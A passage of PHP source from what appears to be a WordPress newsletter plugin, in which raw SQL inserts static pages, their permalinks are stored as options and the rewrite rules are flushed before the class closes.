                            ('1', '$post_date', '$post_date_gmt', '".$page['tag']."', '', '".$page['title']."', '', 'static', 'closed', 'closed', '', '".$page['name']."', '', '', '$post_date', '$post_date_gmt', '$post_parent', '0')";
                                            }
                          $wpdb->query($sql);
                          $post_id = $wpdb->insert_id;
                          if($i == 0) {
                            $first_id = $post_id;
                            }
                          $wpdb->query("UPDATE $wpdb->posts SET guid = '" . get_permalink($post_id) . "' WHERE ID = '$post_id'");
                          update_option($page['option'],  get_permalink($post_id));
                          $newpages = true;
                          update_option('meenews_idPageNewsletter',  $check_page['ID']);

                          $i++;
                        }
                  }
                  if($newpages == true) {
                    wp_cache_delete('all_page_ids', 'pages');
                    $wp_rewrite->flush_rules();
                  }
           }else{

                  return  $check_page;

           }

        }

##################################################################
} # end class
##################################################################
